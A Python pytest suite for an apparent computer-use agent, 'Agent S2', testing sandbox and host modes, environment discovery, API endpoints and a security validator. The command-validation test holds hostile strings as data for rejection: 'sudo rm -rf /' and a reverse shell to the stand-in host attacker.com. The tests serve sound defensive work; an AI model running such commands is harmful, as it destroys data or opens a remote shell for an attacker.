#!/usr/bin/env python3
"""
Comprehensive test suite for Agent S2 dual-mode functionality

Tests both sandbox and host modes, including:
- Mode switching
- Environment discovery
- Security validation
- API endpoints
- Configuration management
"""

import os
import sys
import json
import time
import pytest
import requests
import subprocess
from typing import Dict, Any, List, Optional
from pathlib import Path

# Add the agent_s2 package to Python path
sys.path.insert(0, str(Path(__file__).parent.parent.parent / "agent_s2"))

from agent_s2.config import Config, AgentMode
from agent_s2.environment import EnvironmentDiscovery, ModeContext
from agent_s2.security import SecurityValidator, get_security_monitor


class AgentS2TestFixture:
    """Test fixture for Agent S2 testing"""
    
    def __init__(self):
        self.base_url = "http://localhost:4113"
        self.original_mode = None
        self.test_session_id = f"test_{int(time.time())}"
        
    def setup(self):
        """Set up test environment"""
        # Store original mode
        try:
            response = requests.get(f"{self.base_url}/modes/current", timeout=5)
            if response.status_code == 200:
                self.original_mode = response.json().get("current_mode")
        except requests.RequestException:
            # Agent S2 may not be running, that's ok for some tests
            pass
    
    def teardown(self):
        """Clean up test environment"""
        # Restore original mode if it was changed
        if self.original_mode and self.is_agent_running():
            try:
                requests.post(
                    f"{self.base_url}/modes/switch", 
                    json={"new_mode": self.original_mode},
                    timeout=10
                )
            except requests.RequestException:
                pass
    
    def is_agent_running(self) -> bool:
        """Check if Agent S2 is running"""
        try:
            response = requests.get(f"{self.base_url}/health", timeout=3)
            return response.status_code == 200
        except requests.RequestException:
            return False
    
    def wait_for_agent(self, timeout: int = 30) -> bool:
        """Wait for Agent S2 to be ready"""
        for _ in range(timeout):
            if self.is_agent_running():
                return True
            time.sleep(1)
        return False


@pytest.fixture
def agent_fixture():
    """Pytest fixture for Agent S2 testing"""
    fixture = AgentS2TestFixture()
    fixture.setup()
    yield fixture
    fixture.teardown()


class TestConfiguration:
    """Test configuration system for dual-mode support"""
    
    def test_config_mode_detection(self):
        """Test that configuration correctly detects current mode"""
        # Test with environment variable
        os.environ["AGENT_S2_MODE"] = "sandbox"
        Config.CURRENT_MODE = AgentMode("sandbox")
        assert Config.is_sandbox_mode() == True
        assert Config.is_host_mode() == False
        
        os.environ["AGENT_S2_MODE"] = "host"
        Config.CURRENT_MODE = AgentMode("host")
        assert Config.is_sandbox_mode() == False
        assert Config.is_host_mode() == True
    
    def test_config_allowed_applications(self):
        """Test application configuration for different modes"""
        # Sandbox mode
        Config.CURRENT_MODE = AgentMode.SANDBOX  
        sandbox_apps = Config.get_allowed_applications()
        assert "firefox-esr" in sandbox_apps
        assert "mousepad" in sandbox_apps
        assert len(sandbox_apps) == len(Config.SANDBOX_APPLICATIONS)
        
        # Host mode with wildcard
        Config.CURRENT_MODE = AgentMode.HOST
        Config.HOST_ALLOWED_APPLICATIONS = "*"
        host_apps = Config.get_allowed_applications()
        assert "*" in host_apps
    
    def test_config_security_constraints(self):
        """Test security constraint configuration"""
        # Sandbox mode constraints
        Config.CURRENT_MODE = AgentMode.SANDBOX
        sandbox_constraints = Config.get_security_constraints()
        assert sandbox_constraints["filesystem_access"] == "none"
        assert sandbox_constraints["isolation_level"] == "high"
        
        # Host mode constraints
        Config.CURRENT_MODE = AgentMode.HOST
        host_constraints = Config.get_security_constraints()
        assert host_constraints["filesystem_access"] == "mounted_only"
        assert host_constraints["isolation_level"] == "medium"
    
    def test_config_mode_switching(self):
        """Test mode switching functionality"""
        original_mode = Config.CURRENT_MODE
        
        try:
            # Test switching to host mode (if enabled)
            if Config.HOST_MODE_ENABLED:
                Config.switch_mode(AgentMode.HOST)
                assert Config.CURRENT_MODE == AgentMode.HOST
                assert os.environ.get("AGENT_S2_MODE") == "host"
            
            # Test switching to sandbox mode
            Config.switch_mode(AgentMode.SANDBOX)
            assert Config.CURRENT_MODE == AgentMode.SANDBOX
            assert os.environ.get("AGENT_S2_MODE") == "sandbox"
            
        finally:
            # Restore original mode
            Config.CURRENT_MODE = original_mode


class TestEnvironmentDiscovery:
    """Test environment discovery for both modes"""
    
    def test_sandbox_discovery(self):
        """Test environment discovery in sandbox mode"""
        discovery = EnvironmentDiscovery(AgentMode.SANDBOX)
        capabilities = discovery.capabilities
        
        assert capabilities["mode"] == "sandbox"
        assert capabilities["display"]["type"] == "virtual"
        assert capabilities["window_manager"]["type"] == "fluxbox"
        assert "firefox-esr" in capabilities["applications"]
        assert capabilities["security"]["isolation_level"] == "high"
        assert "No host filesystem access" in capabilities["limitations"]
    
    def test_host_discovery(self):
        """Test environment discovery in host mode"""
        discovery = EnvironmentDiscovery(AgentMode.HOST)
        capabilities = discovery.capabilities
        
        assert capabilities["mode"] == "host"
        assert capabilities["security"]["isolation_level"] == "medium"
        assert "host_applications" in capabilities["capabilities"]
        assert capabilities["network"]["localhost_available"] == True
    
    def test_application_discovery(self):
        """Test application discovery in both modes"""
        # Sandbox mode - should find pre-installed apps
        sandbox_discovery = EnvironmentDiscovery(AgentMode.SANDBOX)
        sandbox_apps = sandbox_discovery.capabilities["applications"]
        
        assert len(sandbox_apps) > 0
        assert "firefox-esr" in sandbox_apps
        for app_name, app_info in sandbox_apps.items():
            assert "name" in app_info
            assert "launcher" in app_info
            assert "capabilities" in app_info
        
        # Host mode - should discover system applications
        host_discovery = EnvironmentDiscovery(AgentMode.HOST)
        host_apps = host_discovery.capabilities["applications"]
        
        # Host mode should find more applications than sandbox
        # (unless host application discovery fails)
        assert isinstance(host_apps, dict)
    
    def test_available_actions(self):
        """Test available actions for different modes"""
        sandbox_discovery = EnvironmentDiscovery(AgentMode.SANDBOX)
        sandbox_actions = sandbox_discovery.get_available_actions()
        
        assert "screenshot" in sandbox_actions
        assert "mouse_click" in sandbox_actions
        assert "keyboard_type" in sandbox_actions
        
        host_discovery = EnvironmentDiscovery(AgentMode.HOST)
        host_actions = host_discovery.get_available_actions()
        
        # Host mode should have additional actions
        assert "launch_native_application" in host_actions
        assert "file_system_operations" in host_actions
        assert len(host_actions) >= len(sandbox_actions)


class TestModeContext:
    """Test mode context management"""
    
    def test_sandbox_context(self):
        """Test context generation for sandbox mode"""
        context = ModeContext(AgentMode.SANDBOX)
        
        assert context.mode == AgentMode.SANDBOX
        assert "SANDBOX MODE" in context.system_prompt
        assert "Alt+F1" in context.system_prompt
        assert "firefox" in context.system_prompt.lower()
        
        summary = context.get_context_summary()
        assert summary["mode"] == "sandbox"
        assert summary["security_level"] == "high"
    
    def test_host_context(self):
        """Test context generation for host mode"""
        context = ModeContext(AgentMode.HOST)
        
        assert context.mode == AgentMode.HOST
        assert "HOST MODE" in context.system_prompt
        assert "extended" in context.system_prompt.lower()
        
        summary = context.get_context_summary()
        assert summary["mode"] == "host"
        assert summary["security_level"] == "medium"
    
    def test_application_info(self):
        """Test application information retrieval"""
        context = ModeContext(AgentMode.SANDBOX)
        
        # Test getting info for existing application
        firefox_info = context.get_application_info("firefox-esr")
        assert firefox_info is not None
        assert firefox_info["name"] == "Firefox ESR"
        
        # Test launch instructions
        launch_instructions = context.get_launch_instructions("firefox-esr")
        assert launch_instructions is not None
        assert "firefox" in launch_instructions.lower()
        
        # Test non-existent application
        fake_info = context.get_application_info("nonexistent-app")
        assert fake_info is None
    
    def test_action_availability(self):
        """Test action availability checking"""
        sandbox_context = ModeContext(AgentMode.SANDBOX)
        host_context = ModeContext(AgentMode.HOST)
        
        # Common actions should be available in both modes
        assert sandbox_context.is_action_available("screenshot")
        assert host_context.is_action_available("screenshot")
        
        # Host-specific actions
        assert not sandbox_context.is_action_available("launch_native_application")
        assert host_context.is_action_available("launch_native_application")


class TestSecurityValidation:
    """Test security validation system"""
    
    def test_file_path_validation_sandbox(self):
        """Test file path validation in sandbox mode"""
        validator = SecurityValidator()
        validator.mode = AgentMode.SANDBOX
        
        # Allowed paths in sandbox
        is_valid, error = validator.validate_file_path("/home/agents2/test.txt", "read")
        assert is_valid == True
        
        is_valid, error = validator.validate_file_path("/tmp/temp.txt", "write")
        assert is_valid == True
        
        # Forbidden paths in sandbox
        is_valid, error = validator.validate_file_path("/etc/passwd", "read")
        assert is_valid == False
        assert "forbidden" in error.lower()
        
        is_valid, error = validator.validate_file_path("/root/secret.txt", "read")
        assert is_valid == False
    
    def test_file_path_validation_host(self):
        """Test file path validation in host mode"""
        validator = SecurityValidator()
        validator.mode = AgentMode.HOST
        
        # Container paths should be allowed
        is_valid, error = validator.validate_file_path("/home/agents2/test.txt", "read")
        assert is_valid == True
        
        # Forbidden paths should still be blocked
        is_valid, error = validator.validate_file_path("/etc/passwd", "read")
        assert is_valid == False
        
        # System paths should be allowed for reading
        is_valid, error = validator.validate_file_path("/usr/share/applications/test.desktop", "read")
        assert is_valid == True
    
    def test_command_validation(self):
        """Test command validation"""
        validator = SecurityValidator()
        
        # Safe commands
        is_valid, error = validator.validate_command("ls -la")
        assert is_valid == True
        
        is_valid, error = validator.validate_command("firefox")
        assert is_valid == True
        
        # Dangerous commands
        is_valid, error = validator.validate_command("sudo rm -rf /")
        assert is_valid == False
        assert "forbidden" in error.lower()
        
        is_valid, error = validator.validate_command("bash -i >& /dev/tcp/attacker.com/4444 0>&1")
        assert is_valid == False
    
    def test_network_validation(self):
        """Test network access validation"""
        validator = SecurityValidator()
        
        # Public URLs should be allowed
        is_valid, error = validator.validate_network_access("https://www.google.com")
        assert is_valid == True
        
        # Test mode-specific restrictions
        validator.mode = AgentMode.SANDBOX
        is_valid, error = validator.validate_network_access("http://localhost:8080")
        assert is_valid == False  # Localhost blocked in sandbox
        
        validator.mode = AgentMode.HOST  
        is_valid, error = validator.validate_network_access("http://localhost:8080")
        assert is_valid == True  # Localhost allowed in host mode
    
    def test_security_policy_check(self):
        """Test comprehensive security policy checking"""
        validator = SecurityValidator()
        
        # File operations
        is_valid, error = validator.check_security_policy("file_read", "/tmp/test.txt")
        assert is_valid == True
        
        is_valid, error = validator.check_security_policy("file_write", "/etc/passwd")
        assert is_valid == False
        
        # Command execution
        is_valid, error = validator.check_security_policy("command_execute", "firefox")
        assert is_valid == True
        
        is_valid, error = validator.check_security_policy("command_execute", "sudo su -")
        assert is_valid == False


class TestAPIEndpoints:
    """Test mode-aware API endpoints"""
    
    def test_health_endpoint(self, agent_fixture):
        """Test health endpoint includes mode information"""
        if not agent_fixture.is_agent_running():
            pytest.skip("Agent S2 not running")
        
        response = requests.get(f"{agent_fixture.base_url}/health")
        assert response.status_code == 200
        
        data = response.json()
        assert "mode_info" in data
        assert "current_mode" in data["mode_info"]
        assert data["mode_info"]["current_mode"] in ["sandbox", "host"]
    
    def test_capabilities_endpoint(self, agent_fixture):
        """Test capabilities endpoint is mode-aware"""
        if not agent_fixture.is_agent_running():
            pytest.skip("Agent S2 not running")
        
        response = requests.get(f"{agent_fixture.base_url}/capabilities")
        assert response.status_code == 200
        
        data = response.json()
        assert "mode_info" in data
        assert "capabilities" in data
        assert "supported_tasks" in data
        
        # Check for mode-specific capabilities
        current_mode = data["mode_info"]["current_mode"]
        if current_mode == "host":
            assert "host_applications" in data["capabilities"]
        else:
            assert data["capabilities"].get("host_applications", False) == False
    
    def test_modes_current_endpoint(self, agent_fixture):
        """Test current mode endpoint"""
        if not agent_fixture.is_agent_running():
            pytest.skip("Agent S2 not running")
        
        response = requests.get(f"{agent_fixture.base_url}/modes/current")
        assert response.status_code == 200
        
        data = response.json()
        assert "current_mode" in data
        assert "available_modes" in data
        assert "security_level" in data
        assert data["current_mode"] in ["sandbox", "host"]
        assert "sandbox" in data["available_modes"]
    
    def test_modes_environment_endpoint(self, agent_fixture):
        """Test environment information endpoint"""
        if not agent_fixture.is_agent_running():
            pytest.skip("Agent S2 not running")
        
        response = requests.get(f"{agent_fixture.base_url}/modes/environment")
        assert response.status_code == 200
        
        data = response.json()
        assert "mode" in data
        assert "display_type" in data
        assert "capabilities" in data
        assert "limitations" in data
        assert "security_constraints" in data
    
    def test_modes_applications_endpoint(self, agent_fixture):
        """Test applications discovery endpoint"""
        if not agent_fixture.is_agent_running():
            pytest.skip("Agent S2 not running")
        
        response = requests.get(f"{agent_fixture.base_url}/modes/applications")
        assert response.status_code == 200
        
        data = response.json()
        assert "applications" in data
        assert "applications_count" in data
        assert isinstance(data["applications"], list)
        assert data["applications_count"] == len(data["applications"])
    
    def test_modes_security_endpoint(self, agent_fixture):
        """Test security information endpoint"""
        if not agent_fixture.is_agent_running():
            pytest.skip("Agent S2 not running")
        
        response = requests.get(f"{agent_fixture.base_url}/modes/security")
        assert response.status_code == 200
        
        data = response.json()
        assert "security_level" in data
        assert "constraints" in data
        assert "limitations" in data


class TestModeIntegration:
    """Integration tests for mode switching and functionality"""
    
    @pytest.mark.slow
    def test_mode_switching_flow(self, agent_fixture):
        """Test complete mode switching workflow"""
        if not agent_fixture.is_agent_running():
            pytest.skip("Agent S2 not running")
        
        # Get initial mode
        response = requests.get(f"{agent_fixture.base_url}/modes/current")
        assert response.status_code == 200
        initial_mode = response.json()["current_mode"]
        
        # Check if host mode is available
        if not response.json().get("can_switch_to_host", False):
            pytest.skip("Host mode not available")
        
        # Switch to opposite mode
        target_mode = "host" if initial_mode == "sandbox" else "sandbox"
        
        response = requests.post(
            f"{agent_fixture.base_url}/modes/switch",
            json={"new_mode": target_mode}
        )
        
        if response.status_code == 200:
            # Wait for mode switch to complete
            time.sleep(5)
            
            # Verify mode changed
            response = requests.get(f"{agent_fixture.base_url}/modes/current")
            if response.status_code == 200:
                current_mode = response.json()["current_mode"]
                assert current_mode == target_mode
        else:
            # Mode switch may fail due to configuration - that's ok
            pytest.skip(f"Mode switch failed: {response.text}")
    
    @pytest.mark.slow
    def test_screenshot_functionality_both_modes(self, agent_fixture):
        """Test screenshot functionality in both modes"""
        if not agent_fixture.is_agent_running():
            pytest.skip("Agent S2 not running")
        
        # Test screenshot in current mode
        response = requests.get(f"{agent_fixture.base_url}/screenshot")
        assert response.status_code == 200
        
        data = response.json()
        assert "success" in data
        assert data["success"] == True
        assert "data" in data
        assert data["data"].startswith("data:image/")
    
    def test_environment_consistency(self, agent_fixture):
        """Test that environment discovery is consistent with API"""
        if not agent_fixture.is_agent_running():
            pytest.skip("Agent S2 not running")
        
        # Get mode info from API
        response = requests.get(f"{agent_fixture.base_url}/modes/current")
        assert response.status_code == 200
        api_mode = response.json()["current_mode"]
        
        # Get environment info from API
        response = requests.get(f"{agent_fixture.base_url}/modes/environment")
        assert response.status_code == 200
        api_env = response.json()
        
        # Compare with direct environment discovery
        discovery = EnvironmentDiscovery(AgentMode(api_mode))
        direct_caps = discovery.capabilities
        
        assert api_env["mode"] == direct_caps["mode"]
        assert api_env["display_type"] == direct_caps["display"]["type"]


def run_tests():
    """Run all tests with proper configuration"""
    # Set up test environment
    os.environ.setdefault("AGENT_S2_MODE", "sandbox")
    os.environ.setdefault("AGENT_S2_HOST_MODE_ENABLED", "false")
    
    # Run pytest with verbose output
    exit_code = pytest.main([
        __file__,
        "-v",
        "--tb=short",
        "-x",  # Stop on first failure
        "--durations=10"  # Show slowest 10 tests
    ])
    
    return exit_code


if __name__ == "__main__":
    exit_code = run_tests()
    sys.exit(exit_code)